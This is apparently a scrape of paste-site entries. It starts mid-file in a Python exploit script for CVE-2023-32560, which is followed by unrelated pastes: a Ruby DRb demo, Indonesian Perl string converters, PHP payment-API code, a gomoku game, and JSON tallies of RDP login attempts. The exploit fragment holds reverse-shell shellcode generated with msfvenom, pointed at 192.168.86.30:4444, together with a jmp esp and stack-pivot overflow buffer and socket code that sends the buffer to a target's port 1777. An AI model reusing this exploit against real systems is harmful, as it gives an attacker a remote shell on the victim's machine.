        self.hdr_size = sum([len(item.pack()) for item in hp.hdr])
        self.payload_size = sum([len(item.pack()) for item in hp.payload])
        self.unk = 0  # Unknown value

    def pack(self):
        return struct.pack('>IIII', self.msg_size, self.hdr_size, self.payload_size, self.unk)

# Create a message structure
class Msg:
    def __init__(self, hp):
        self.pre = Preamble(hp)
        self.hdrpay = hp

    def pack(self):
        return self.pre.pack() + self.hdrpay.pack()

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.86.30 LPORT=4444 exitfunc=thread -f python
shellcode =  b""""
shellcode += b""fce8820000006089e531c064""
shellcode += b""8b50308b520c8b52148b7228""
shellcode += b""0fb74a2631ffac3c617c022c""
shellcode += b""20c1cf0d01c7e2f252578b52""
shellcode += b""108b4a3c8b4c1178e34801d1""
shellcode += b""518b592001d38b4918e33a49""
shellcode += b""8b348b01d631ffacc1cf0d01""
shellcode += b""c738e075f6037df83b7d2475""
shellcode += b""e4588b582401d3668b0c4b8b""
shellcode += b""581c01d38b048b01d0894424""
shellcode += b""245b5b61595a51ffe05f5f5a""
shellcode += b""8b12eb8d5d68333200006877""
shellcode += b""73325f54684c772607ffd5b8""
shellcode += b""9001000029c454506829806b""
shellcode += b""00ffd5505050504050405068""
shellcode += b""ea0fdfe0ffd5976a0568c0a8""
shellcode += b""561e680200115c89e66a1056""
shellcode += b""576899a57461ffd585c0740c""
shellcode += b""ff4e0875ec68f0b5a256ffd5""
shellcode += b""68636d640089e357575731f6""
shellcode += b""6a125956e2fd66c744243c01""
shellcode += b""018d442410c6004454505656""
shellcode += b""5646564e565653566879cc3f""
shellcode += b""86ffd589e04e5646ff306808""
shellcode += b""871d60ffd5bbe01d2a0a68a6""
shellcode += b""95bd9dffd53c067c0a80fbe0""
shellcode += b""7505bb4713726f6a0053ffd5""

buf = b'90' * 340
buf += b'812b4100' # jmp esp (0x00412b81)
buf += b'90909090'
buf += b'90909090'
buf += shellcode
buf += b'41' * 80
buf += b'84d45200' # stack pivot: add esp, 0x00000FA0 ; retn 0x0004 ; (0x0052d484)
buf += b'43' * (0x800 - len(buf))

buf2 = b'41' * 0x1000

# Create message payload
hdr = [Item(3, ""pwned"", buf)]
payload = [Item(3, ""pwned"", buf2)] # dummy payload, probabaly not necessary
hp_instance = HP(hdr, payload)
msg_instance = Msg(hp_instance)

# Default port
port = 1777

# check for target host argument
if len(sys.argv) > 1:
    host = sys.argv[1]
else:
    print(""Usage: python3 CVE-2023-32560.py <host ip>"")
    sys.exit()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(msg_instance.pack())
    print(""Message sent!"")
    s.close()
            "
gFbCMtZk,server&client.rb,paperline27,Ruby,Sunday 21st of January 2024 09:29:00 PM CDT,"#server
require 'drb'

class Calculator
  def add(a, b)
    a + b
  end
end

calculator = Calculator.new
DRb.start_service('druby://localhost:12345', calculator)
DRb.thread.join


#client
require 'drb'

DRb.start_service
calculator = DRbObject.new_with_uri('druby://localhost:12345')

result = calculator.add(5, 3)
puts ""Result of remote addition: #{result}"""
7VQqLBf3,jumlah kata pada file teks.txt,paperline27,Perl,Sunday 21st of January 2024 09:10:32 PM CDT,"# Program untuk menghitung jumlah kata dalam sebuah berkas teks

# Membuka berkas teks
open my $file_handle, '<', 'teks.txt' or die ""Tidak dapat membuka berkas: $!"";

# Inisialisasi variabel untuk menghitung jumlah kata
my $jumlah_kata = 0;

# Membaca setiap baris dalam berkas
while (my $baris = <$file_handle>) {
    # Memecah baris menjadi kata-kata
    my @kata_kata = split /\s+/, $baris;

    # Menambah jumlah kata
    $jumlah_kata += scalar @kata_kata;
}

# Menutup berkas
close $file_handle;

# Menampilkan jumlah kata
print ""Jumlah kata dalam berkas: $jumlah_kata\n"";"
qkn05Smm,VA Winpay,jamboljack,PHP,Sunday 21st of January 2024 09:06:06 PM CDT,"$httpMethod  = 'POST';
            $endpointUrl = $detail->jenis_bayar_pk1;
            $timestamp   = date(DateTime::RFC3339);
            $dateTime    = new DateTime($timestamp);
            $dateTime->modify('+1 hours');
            $expiredDate = $dateTime->format(DateTime::RFC3339);
            $totalAmount = array(
                'value'    => $detail->invoice_total,
                'currency' => ""IDR"",
            );
            // Kode Bank
            $additionalInfo = array(
                'channel' => $detail->jenis_bayar_code,
            );

            $payload = array(
                ""customerNo""            => $detail->pelanggan_nomor,
                ""virtualAccountName""    => $detail->pelanggan_nama,
                ""trxId""                 => $detail->invoice_nomor,
                ""totalAmount""           => $totalAmount,
                ""virtualAccountTrxType"" => 'c',
                ""expiredDate""           => $expiredDate,
                ""additionalInfo""        => $additionalInfo,
            );

            $body                  = json_encode($payload);
            $hashedBody            = strtolower(bin2hex(hash('sha256', json_encode($payload, JSON_UNESCAPED_SLASHES), true)));
            $signature             = $this->generateSignatureRequest($httpMethod, $endpointUrl, $hashedBody, $timestamp);
            $requestHeadersRequest = array(
                'Content-Type: application/json',
                'Accept: application/json',
                'X-TIMESTAMP: ' . $timestamp,
                'X-SIGNATURE: ' . $signature,
                'X-PARTNER-ID: ' . $detail->jenis_bayar_mk,
                'X-EXTERNAL-ID: ' . uniqid(),
                'CHANNEL-ID: WEB',
            );

            $urlAPI         = $detail->jenis_bayar_url;
            $urlPostrequest = $urlAPI . $detail->jenis_bayar_pk1;
            $curl           = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL            => $urlPostrequest,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING       => '',
                CURLOPT_MAXREDIRS      => 10,
                CURLOPT_TIMEOUT        => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION   => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST  => 'POST',
                CURLOPT_POSTFIELDS     => $body,
                CURLOPT_HTTPHEADER     => $requestHeadersRequest,
            ));

            $Respx = curl_exec($curl);
            curl_close($curl);
            $rsp  = json_decode($Respx, true);
            $Code = $rsp['responseCode'];
            if ($Code == '2002700') {
                $virtualAccountNo = $rsp['virtualAccountData']['virtualAccountNo'];
                $partnerServiceId = $rsp['virtualAccountData']['partnerServiceId'];
                // Update Payment Code
                $invoice_id  = $detail->invoice_id;
                $dataPayment = array(
                    'winpay_data'  => $Respx,
                    'reff_id'      => trim($partnerServiceId),
                    'payment_code' => trim($virtualAccountNo),
                );

                $this->db->where('invoice_id', $invoice_id);
                $this->db->update('sid_invoice', $dataPayment);

                $invoice_id_enc = $this->secure->encrypt_url($invoice_id);
                $response       = ['status' => 'success', 'url_payment' => site_url('client/invoice/payment/' . strtolower($KodeBank) . '/' . $invoice_id_enc)];
            } else {
                $message  = $rsp['responseMessage'];
                $response = ['status' => 'error', 'status_message' => $message];
            }

            echo json_encode($response);"
7E0KEs21,String to Binary.pl,paperline27,Perl,Sunday 21st of January 2024 08:41:08 PM CDT,"#!/usr/bin/perl
use strict;
use warnings;
use Term::ANSIColor;

sub string_to_binary {
    my $input_string = shift;
    my $binary_representation = unpack(""B*"", $input_string);
    return $binary_representation;
}

print color('bold blue');
print ""Masukkan string yang ingin diubah ke representasi biner: "";
print color('reset');
my $user_input = <STDIN>;
chomp($user_input);

my $binary_result = string_to_binary($user_input);

print color('bold yellow');
print ""Representasi Biner dari string '$user_input': 0b$binary_result\n"";
print color('reset');"
ZGttNZGF,String to MD5,paperline27,Perl,Sunday 21st of January 2024 08:26:03 PM CDT,"#!/usr/bin/perl
use strict;
use warnings;
use Digest::MD5 qw(md5_hex);
use Term::ANSIColor;

sub string_to_md5 {
    my $input_string = shift;
    my $md5_result = md5_hex($input_string);
    return $md5_result;
}

print color('bold yellow');
print ""Masukkan string yang ingin diubah ke MD5: "";
print color('reset');
my $user_input = <STDIN>;
chomp($user_input);

my $md5_result = string_to_md5($user_input);

print color('bold blue');
print ""Nilai MD5 dari string '$user_input': $md5_result\n"";
print color('reset');"
XvCWgAjP,Hex to String.pl,paperline27,Perl,Sunday 21st of January 2024 08:20:53 PM CDT,"#!/usr/bin/perl
use strict;
use warnings;
use Term::ANSIColor;

sub hex_to_string {
    my $hex_input = shift;
    my $string_representation = pack(""H*"", $hex_input);
    return $string_representation;
}

print color('bold blue');
print ""Masukkan representasi heksadesimal: "";
print color('reset');
my $user_hex_input = <STDIN>;
chomp($user_hex_input);

my $string_result = hex_to_string($user_hex_input);

print color('bold green');
print ""String dari representasi heksadesimal '$user_hex_input': $string_result\n"";
print color('reset');"
7MSP0wMX,String to Hex.pl,paperline27,Perl,Sunday 21st of January 2024 08:15:20 PM CDT,"#!/usr/bin/perl
use strict;
use warnings;
use Term::ANSIColor;
sub string_to_hex {
    my $input_string = shift;
    my $hex_representation = unpack(""H*"", $input_string);
    return ""0x$hex_representation"";
}
print color('bold blue');
print ""Masukkan string yang ingin diubah ke heksadesimal: "";
print color('reset');
my $user_input = <STDIN>;
chomp($user_input);
my $hex_result = string_to_hex($user_input);
print color('bold green');
print ""Representasi Heksadesimal dari '$user_input': $hex_result\n"";
print color('reset');"
E85meVfa,FIR,excellent940707,Python,Sunday 21st of January 2024 07:42:13 PM CDT,"# -*- coding: utf-8 -*-
""""""
Created on Wed Jan 10 21:27:51 2024

@author: yiwen
""""""

import numpy as np

def build_board(size = (9,9)):
    return np.zeros(size)

def print_board(board):
    
    print('  ', end='')
    for i in range(len(board)):
        print(i,end=' ')
    print()
    
    for i in range(board.shape[0]):
        print(i, end=' ')
        for j in range(board.shape[1]):

            if board[i,j]==1:
                print('x ',end='')
            elif board[i,j]==-1:
                print('O ',end='')
            else:
                print('- ',end='')
        print()
        
def check_win(board, n=5):
    #斜下
    for i in range(board.shape[0]-4):
        for j in range(board.shape[1]-4):
            fuc = lambda x:all([board[i+z, j+z]==x for z in range(n)])
            if fuc(1):
                return 1
            elif fuc(-1):
                return -1
    #斜上
    for i in range(4,board.shape[0]):
        for j in range(board.shape[1]-4):
            fuc = lambda x:all([board[i-z, j+z]==x for z in range(n)])
            if fuc(1):
                return 1
            elif fuc(-1):
                return -1
    #直
    for i in range(board.shape[0]-4):
        for j in range(board.shape[1]):
            fuc = lambda x:all([board[i+z, j]==x for z in range(n)])
            if fuc(1):
                return 1
            elif fuc(-1):
                return -1
    #橫
    for i in range(board.shape[0]):
        for j in range(board.shape[1]-4):
            fuc = lambda x:all([board[i, j+z]==x for z in range(n)])
            if fuc(1):
                return 1
            elif fuc(-1):
                return -1
    return 0

def place_piece(board, move, player):
    tmp = board.copy()
    if tmp[move]==0:
        tmp[move] = player
        return tmp

def available_moves(board):
    size = board.shape[0]*board.shape[1]
    for i in range(size):
        x, y = i//board.shape[0], i%board.shape[0]
        if board[x][y] == 0:
            yield (x, y)

def human_player(board):
    i, j = [int(i) for i in input(""please input your move: "").split(' ')]
    return (i,j)

if __name__ =='__main__':
    board = build_board()
    avail_moves = list(available_moves(board))
    player_now = 1
    
    while True:
        print_board(board)
        reward = 0
        move = human_player(board)
            
        if move not in avail_moves:
            print(""wrong input"")
            break
        board = place_piece(board, move, player_now)
        
        avail_moves.remove(move)
        
        if len(avail_moves)==0:
            print(""no moves left, game ended a draw"")
            break
        
        if check_win(board)==1:
            print(""player 1 win!"")
            break
            
        if check_win(board)==-1:
            print(""player 2 win!"")
            break
        
        player_now = player_now*-1"
Ct0z9HPf,2024-01-21_stats.json,rdp_snitch,JSON,Sunday 21st of January 2024 06:18:08 PM CDT,"{
  ""ip"": {
    ""147.78.47.69"": 6,
    ""194.165.17.21"": 39,
    ""45.130.83.48"": 3,
    ""85.198.9.63"": 6,
    ""194.165.16.72"": 6,
    ""194.165.16.78"": 6,
    ""122.186.127.58"": 354,
    ""109.69.7.157"": 18,
    ""190.85.232.116"": 3,
    ""185.190.24.54"": 3,
    ""205.210.31.70"": 9,
    ""81.19.135.2"": 9,
    ""103.184.47.83"": 3,
    ""196.190.117.7"": 6,
    ""185.170.144.3"": 6,
    ""202.55.132.183"": 3,
    ""205.210.31.238"": 9,
    ""194.165.16.10"": 6,
    ""87.251.75.145"": 6,
    ""201.80.184.90"": 3,
    ""194.165.16.73"": 12,
    ""43.135.162.126"": 1671,
    ""139.59.185.252"": 3,
    ""45.87.212.182"": 3,
    ""172.232.226.89"": 3,
    ""101.36.106.208"": 3,
    ""198.23.194.178"": 3,
    ""94.20.21.101"": 3,
    ""194.169.175.21"": 6,
    ""205.210.31.26"": 9,
    ""185.161.248.53"": 3,
    ""123.56.20.194"": 3,
    ""43.134.171.213"": 345,
    ""45.130.83.146"": 3,
    ""87.251.75.64"": 3,
    ""213.109.202.232"": 9,
    ""67.133.192.80"": 3,
    ""167.94.146.53"": 3,
    ""62.204.41.195"": 6,
    ""167.94.145.59"": 3,
    ""45.227.254.48"": 6,
    ""198.235.24.236"": 9
  },
  ""asn"": {
    ""AS209588"": 15,
    ""AS48721"": 69,
    ""AS206092"": 6,
    ""AS60077"": 6,
    ""AS9498"": 354,
    ""AS21183"": 18,
    ""AS14080"": 3,
    ""AS211632"": 3,
    ""AS396982"": 36,
    ""AS146817"": 3,
    ""AS24757"": 6,
    ""AS197414"": 6,
    ""AS63737"": 3,
    ""AS208091"": 9,
    ""AS28573"": 3,
    ""AS132203"": 2016,
    ""AS14061"": 3,
    ""AS9009"": 3,
    ""AS63949"": 3,
    ""AS135377"": 3,
    ""AS36352"": 3,
    ""AS29049"": 3,
    ""AS209605"": 6,
    ""AS49202"": 3,
    ""AS37963"": 3,
    ""AS208312"": 9,
    ""AS209"": 3,
    ""AS398705"": 6,
    ""AS59425"": 6,
    ""AS267784"": 6
  },
  ""isp"": {
    ""Flyservers S.A."": 90,
    ""Ipxo Limited"": 6,
    ""Asre Dadeha Asiatech"": 6,
    ""BHARTI"": 354,
    ""Vodafone Network"": 18,
    ""Telmex Colombia S.A."": 3,
    ""Internet Solutions & Innovations LTD."": 3,
    ""Google LLC"": 36,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""Ethiotelecom"": 6,
    ""Xhost Internet Solutions LP"": 15,
    ""Vietserver Services Technology Company Limited"": 3,
    ""Claro NXT Telecomunicacoes Ltda"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1671,
    ""DIGITALOCEAN"": 3,
    ""M247 Europe SRL"": 3,
    ""Akamai Technologies, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""HostPapa"": 3,
    ""Delta Telecom"": 3,
    ""UAB Host Baltic"": 6,
    ""Kisara LLC"": 3,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""Aceville Pte.ltd"": 345,
    ""Red Byte LLC"": 9,
    ""CenturyLink"": 3,
    ""Censys, Inc."": 6,
    ""Horizon LLC"": 6
  },
  ""org"": {
    ""Flyservers S.A"": 75,
    ""VPN Consumer New York City, United States of America"": 6,
    ""Asiatech Data Transmission company"": 6,
    ""Bharti Telenet Ltd."": 354,
    ""Unknown"": 372,
    ""Telmex Colombia S.A"": 3,
    ""Tribeka Web Advisors S.A"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Alviva Holding Limited"": 9,
    ""Hubei Feixun Network Co., Ltd"": 3,
    ""Xhostis"": 6,
    ""VietServer Services technology company limited"": 3,
    ""Xhost Internet Solutions"": 9,
    ""NET Servi\u00e7os de Comunica\u00e7\u00e3o S.A."": 3,
    ""Tencent Cloud Computing"": 1671,
    ""DigitalOcean, LLC"": 3,
    ""M247 LTD"": 3,
    ""Akamai Technologies, Inc."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""ColoCrossing"": 3,
    ""EmanuelHosting LTD"": 6,
    ""Kisara LLC"": 3,
    ""Aliyun Computing Co., LTD"": 3,
    ""Chang Way Technologies Co. Limited"": 9,
    ""CenturyLink, Inc"": 3,
    ""Censys, Inc."": 6,
    ""Horizon LLC"": 6,
    ""UAB Host Baltic"": 6
  },
  ""regionName"": {
    ""North Holland"": 21,
    ""Kaunas"": 75,
    ""New York"": 9,
    ""Tehran"": 6,
    ""Tamil Nadu"": 354,
    ""Tirana"": 18,
    ""Bogota D.C."": 3,
    ""Mariehamns stad"": 3,
    ""California"": 1707,
    ""Hesse"": 18,
    ""Hubei"": 3,
    ""Addis Ababa"": 6,
    ""Da Nang"": 3,
    ""Minas Gerais"": 3,
    ""England"": 3,
    ""Jakarta"": 3,
    ""Central and Western District"": 3,
    ""Baku City"": 3,
    ""Moscow"": 18,
    ""Beijing"": 3,
    ""North West"": 345,
    ""New Jersey"": 3,
    ""Vilnius"": 6
  },
  ""country"": {
    ""The Netherlands"": 21,
    ""Lithuania"": 81,
    ""United States"": 1719,
    ""Iran"": 6,
    ""India"": 354,
    ""Albania"": 18,
    ""Colombia"": 3,
    ""Aland Islands"": 3,
    ""Germany"": 18,
    ""China"": 6,
    ""Ethiopia"": 6,
    ""Vietnam"": 3,
    ""Brazil"": 3,
    ""United Kingdom"": 3,
    ""Indonesia"": 3,
    ""Hong Kong"": 3,
    ""Azerbaijan"": 3,
    ""Russia"": 18,
    ""Singapore"": 345
  },
  ""account"": {
    ""Administr"": 33,
    ""142.93.8.59"": 57,
    ""(empty)"": 18,
    ""hello"": 27,
    ""Test"": 45,
    ""a"": 354,
    ""kYcAQIfgi"": 3,
    ""pfLXaH"": 3,
    ""tcMbGx"": 3,
    ""Domain"": 24,
    ""VJtfOHLOw"": 3,
    ""GauDHS"": 3,
    ""AKmrzC"": 3,
    ""user"": 3,
    ""Administrator"": 2019,
    ""uelOeKmig"": 3,
    ""DuihmD"": 3,
    ""GvhwrH"": 3,
    ""GFqJycamp"": 3,
    ""RQjfDp"": 3,
    ""qGREZX"": 3
  },
  ""keyboard"": {
    ""Unknown"": 2616
  },
  ""client_build"": {
    ""Unknown"": 2616
  },
  ""client_name"": {
    ""Unknown"": 2616
  },
  ""ip_type"": {
    ""Unknown"": 183,
    ""mobile & proxy"": 6,
    ""proxy"": 354,
    ""hosting"": 2064,
    ""mobile"": 3,
    ""hosting & proxy"": 6
  }
}"
ZK7CrVcS,2024-01-21_stats.json,rdp_snitch,JSON,Sunday 21st of January 2024 06:16:16 PM CDT,"{
  ""ip"": {
    ""147.78.47.69"": 4,
    ""194.165.17.21"": 26,
    ""45.130.83.48"": 2,
    ""85.198.9.63"": 4,
    ""194.165.16.72"": 4,
    ""194.165.16.78"": 4,
    ""122.186.127.58"": 236,
    ""109.69.7.157"": 12,
    ""190.85.232.116"": 2,
    ""185.190.24.54"": 2,
    ""205.210.31.70"": 6,
    ""81.19.135.2"": 6,
    ""103.184.47.83"": 2,
    ""196.190.117.7"": 4,
    ""185.170.144.3"": 4,
    ""202.55.132.183"": 2,
    ""205.210.31.238"": 6,
    ""194.165.16.10"": 4,
    ""87.251.75.145"": 4,
    ""201.80.184.90"": 2,
    ""194.165.16.73"": 8,
    ""43.135.162.126"": 1114,
    ""139.59.185.252"": 2,
    ""45.87.212.182"": 2,
    ""172.232.226.89"": 2,
    ""101.36.106.208"": 2,
    ""198.23.194.178"": 2,
    ""94.20.21.101"": 2,
    ""194.169.175.21"": 4,
    ""205.210.31.26"": 6,
    ""185.161.248.53"": 2,
    ""123.56.20.194"": 2,
    ""43.134.171.213"": 230,
    ""45.130.83.146"": 2,
    ""87.251.75.64"": 2,
    ""213.109.202.232"": 6,
    ""67.133.192.80"": 2,
    ""167.94.146.53"": 2,
    ""62.204.41.195"": 4,
    ""167.94.145.59"": 2,
    ""45.227.254.48"": 4,
    ""198.235.24.236"": 6
  },
  ""asn"": {
    ""AS209588"": 10,
    ""AS48721"": 46,
    ""AS206092"": 4,
    ""AS60077"": 4,
    ""AS9498"": 236,
    ""AS21183"": 12,
    ""AS14080"": 2,
    ""AS211632"": 2,
    ""AS396982"": 24,
    ""AS146817"": 2,
    ""AS24757"": 4,
    ""AS197414"": 4,
    ""AS63737"": 2,
    ""AS208091"": 6,
    ""AS28573"": 2,
    ""AS132203"": 1344,
    ""AS14061"": 2,
    ""AS9009"": 2,
    ""AS63949"": 2,
    ""AS135377"": 2,
    ""AS36352"": 2,
    ""AS29049"": 2,
    ""AS209605"": 4,
    ""AS49202"": 2,
    ""AS37963"": 2,
    ""AS208312"": 6,
    ""AS209"": 2,
    ""AS398705"": 4,
    ""AS59425"": 4,
    ""AS267784"": 4
  },
  ""isp"": {
    ""Flyservers S.A."": 60,
    ""Ipxo Limited"": 4,
    ""Asre Dadeha Asiatech"": 4,
    ""BHARTI"": 236,
    ""Vodafone Network"": 12,
    ""Telmex Colombia S.A."": 2,
    ""Internet Solutions & Innovations LTD."": 2,
    ""Google LLC"": 24,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Ethiotelecom"": 4,
    ""Xhost Internet Solutions LP"": 10,
    ""Vietserver Services Technology Company Limited"": 2,
    ""Claro NXT Telecomunicacoes Ltda"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 1114,
    ""DIGITALOCEAN"": 2,
    ""M247 Europe SRL"": 2,
    ""Akamai Technologies, Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""HostPapa"": 2,
    ""Delta Telecom"": 2,
    ""UAB Host Baltic"": 4,
    ""Kisara LLC"": 2,
    ""Hangzhou Alibaba Advertising Co"": 2,
    ""Aceville Pte.ltd"": 230,
    ""Red Byte LLC"": 6,
    ""CenturyLink"": 2,
    ""Censys, Inc."": 4,
    ""Horizon LLC"": 4
  },
  ""org"": {
    ""Flyservers S.A"": 50,
    ""VPN Consumer New York City, United States of America"": 4,
    ""Asiatech Data Transmission company"": 4,
    ""Bharti Telenet Ltd."": 236,
    ""Unknown"": 248,
    ""Telmex Colombia S.A"": 2,
    ""Tribeka Web Advisors S.A"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Alviva Holding Limited"": 6,
    ""Hubei Feixun Network Co., Ltd"": 2,
    ""Xhostis"": 4,
    ""VietServer Services technology company limited"": 2,
    ""Xhost Internet Solutions"": 6,
    ""NET Servi\u00e7os de Comunica\u00e7\u00e3o S.A."": 2,
    ""Tencent Cloud Computing"": 1114,
    ""DigitalOcean, LLC"": 2,
    ""M247 LTD"": 2,
    ""Akamai Technologies, Inc."": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""ColoCrossing"": 2,
    ""EmanuelHosting LTD"": 4,
    ""Kisara LLC"": 2,
    ""Aliyun Computing Co., LTD"": 2,
    ""Chang Way Technologies Co. Limited"": 6,
    ""CenturyLink, Inc"": 2,
    ""Censys, Inc."": 4,
    ""Horizon LLC"": 4,
    ""UAB Host Baltic"": 4
  },
  ""regionName"": {
    ""North Holland"": 14,
    ""Kaunas"": 50,
    ""New York"": 6,
    ""Tehran"": 4,
    ""Tamil Nadu"": 236,
    ""Tirana"": 12,
    ""Bogota D.C."": 2,
    ""Mariehamns stad"": 2,
    ""California"": 1138,
    ""Hesse"": 12,
    ""Hubei"": 2,
    ""Addis Ababa"": 4,
    ""Da Nang"": 2,
    ""Minas Gerais"": 2,
    ""England"": 2,
    ""Jakarta"": 2,
    ""Central and Western District"": 2,
    ""Baku City"": 2,
    ""Moscow"": 12,
    ""Beijing"": 2,
    ""North West"": 230,
    ""New Jersey"": 2,
    ""Vilnius"": 4
  },
  ""country"": {
    ""The Netherlands"": 14,
    ""Lithuania"": 54,
    ""United States"": 1146,
    ""Iran"": 4,
    ""India"": 236,
    ""Albania"": 12,
    ""Colombia"": 2,
    ""Aland Islands"": 2,
    ""Germany"": 12,
    ""China"": 4,
    ""Ethiopia"": 4,
    ""Vietnam"": 2,
    ""Brazil"": 2,
    ""United Kingdom"": 2,
    ""Indonesia"": 2,
    ""Hong Kong"": 2,
    ""Azerbaijan"": 2,
    ""Russia"": 12,
    ""Singapore"": 230
  },
  ""account"": {
    ""Administr"": 22,
    ""142.93.8.59"": 38,
    ""(empty)"": 12,
    ""hello"": 18,
    ""Test"": 30,
    ""a"": 236,
    ""kYcAQIfgi"": 2,
    ""pfLXaH"": 2,
    ""tcMbGx"": 2,
    ""Domain"": 16,
    ""VJtfOHLOw"": 2,
    ""GauDHS"": 2,
    ""AKmrzC"": 2,
    ""user"": 2,
    ""Administrator"": 1346,
    ""uelOeKmig"": 2,
    ""DuihmD"": 2,
    ""GvhwrH"": 2,
    ""GFqJycamp"": 2,
    ""RQjfDp"": 2,
    ""qGREZX"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1744
  },
  ""client_build"": {
    ""Unknown"": 1744
  },
  ""client_name"": {
    ""Unknown"": 1744
  },
  ""ip_type"": {
    ""Unknown"": 122,
    ""mobile & proxy"": 4,
    ""proxy"": 236,
    ""hosting"": 1376,
    ""mobile"": 2,
    ""hosting & proxy"": 4
  }
}"
TSQZsTEy,2024-01-21_stats.json,rdp_snitch,JSON,Sunday 21st of January 2024 06:15:09 PM CDT,"{
  ""ip"": {
    ""147.78.47.69"": 2,
    ""194.165.17.21"": 13,
    ""45.130.83.48"": 1,
    ""85.198.9.63"": 2,
    ""194.165.16.72"": 2,
    ""194.165.16.78"": 2,
    ""122.186.127.58"": 118,
    ""109.69.7.157"": 6,
    ""190.85.232.116"": 1,
    ""185.190.24.54"": 1,
    ""205.210.31.70"": 3,
    ""81.19.135.2"": 3,
    ""103.184.47.83"": 1,
    ""196.190.117.7"": 2,
    ""185.170.144.3"": 2,
    ""202.55.132.183"": 1,
    ""205.210.31.238"": 3,
    ""194.165.16.10"": 2,
    ""87.251.75.145"": 2,
    ""201.80.184.90"": 1,
    ""194.165.16.73"": 4,
    ""43.135.162.126"": 557,
    ""139.59.185.252"": 1,
    ""45.87.212.182"": 1,
    ""172.232.226.89"": 1,
    ""101.36.106.208"": 1,
    ""198.23.194.178"": 1,
    ""94.20.21.101"": 1,
    ""194.169.175.21"": 2,
    ""205.210.31.26"": 3,
    ""185.161.248.53"": 1,
    ""123.56.20.194"": 1,
    ""43.134.171.213"": 115,
    ""45.130.83.146"": 1,
    ""87.251.75.64"": 1,
    ""213.109.202.232"": 3,
    ""67.133.192.80"": 1,
    ""167.94.146.53"": 1,
    ""62.204.41.195"": 2,
    ""167.94.145.59"": 1,
    ""45.227.254.48"": 2,
    ""198.235.24.236"": 3
  },
  ""asn"": {
    ""AS209588"": 5,
    ""AS48721"": 23,
    ""AS206092"": 2,
    ""AS60077"": 2,
    ""AS9498"": 118,
    ""AS21183"": 6,
    ""AS14080"": 1,
    ""AS211632"": 1,
    ""AS396982"": 12,
    ""AS146817"": 1,
    ""AS24757"": 2,
    ""AS197414"": 2,
    ""AS63737"": 1,
    ""AS208091"": 3,
    ""AS28573"": 1,
    ""AS132203"": 672,
    ""AS14061"": 1,
    ""AS9009"": 1,
    ""AS63949"": 1,
    ""AS135377"": 1,
    ""AS36352"": 1,
    ""AS29049"": 1,
    ""AS209605"": 2,
    ""AS49202"": 1,
    ""AS37963"": 1,
    ""AS208312"": 3,
    ""AS209"": 1,
    ""AS398705"": 2,
    ""AS59425"": 2,
    ""AS267784"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 30,
    ""Ipxo Limited"": 2,
    ""Asre Dadeha Asiatech"": 2,
    ""BHARTI"": 118,
    ""Vodafone Network"": 6,
    ""Telmex Colombia S.A."": 1,
    ""Internet Solutions & Innovations LTD."": 1,
    ""Google LLC"": 12,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Ethiotelecom"": 2,
    ""Xhost Internet Solutions LP"": 5,
    ""Vietserver Services Technology Company Limited"": 1,
    ""Claro NXT Telecomunicacoes Ltda"": 1,
    ""Shenzhen Tencent Computer Systems Company Limited"": 557,
    ""DIGITALOCEAN"": 1,
    ""M247 Europe SRL"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""HostPapa"": 1,
    ""Delta Telecom"": 1,
    ""UAB Host Baltic"": 2,
    ""Kisara LLC"": 1,
    ""Hangzhou Alibaba Advertising Co"": 1,
    ""Aceville Pte.ltd"": 115,
    ""Red Byte LLC"": 3,
    ""CenturyLink"": 1,
    ""Censys, Inc."": 2,
    ""Horizon LLC"": 2
  },
  ""org"": {
    ""Flyservers S.A"": 25,
    ""VPN Consumer New York City, United States of America"": 2,
    ""Asiatech Data Transmission company"": 2,
    ""Bharti Telenet Ltd."": 118,
    ""Unknown"": 124,
    ""Telmex Colombia S.A"": 1,
    ""Tribeka Web Advisors S.A"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Alviva Holding Limited"": 3,
    ""Hubei Feixun Network Co., Ltd"": 1,
    ""Xhostis"": 2,
    ""VietServer Services technology company limited"": 1,
    ""Xhost Internet Solutions"": 3,
    ""NET Servi\u00e7os de Comunica\u00e7\u00e3o S.A."": 1,
    ""Tencent Cloud Computing"": 557,
    ""DigitalOcean, LLC"": 1,
    ""M247 LTD"": 1,
    ""Akamai Technologies, Inc."": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""ColoCrossing"": 1,
    ""EmanuelHosting LTD"": 2,
    ""Kisara LLC"": 1,
    ""Aliyun Computing Co., LTD"": 1,
    ""Chang Way Technologies Co. Limited"": 3,
    ""CenturyLink, Inc"": 1,
    ""Censys, Inc."": 2,
    ""Horizon LLC"": 2,
    ""UAB Host Baltic"": 2
  },
  ""regionName"": {
    ""North Holland"": 7,
    ""Kaunas"": 25,
    ""New York"": 3,
    ""Tehran"": 2,
    ""Tamil Nadu"": 118,
    ""Tirana"": 6,
    ""Bogota D.C."": 1,
    ""Mariehamns stad"": 1,
    ""California"": 569,
    ""Hesse"": 6,
    ""Hubei"": 1,
    ""Addis Ababa"": 2,
    ""Da Nang"": 1,
    ""Minas Gerais"": 1,
    ""England"": 1,
    ""Jakarta"": 1,
    ""Central and Western District"": 1,
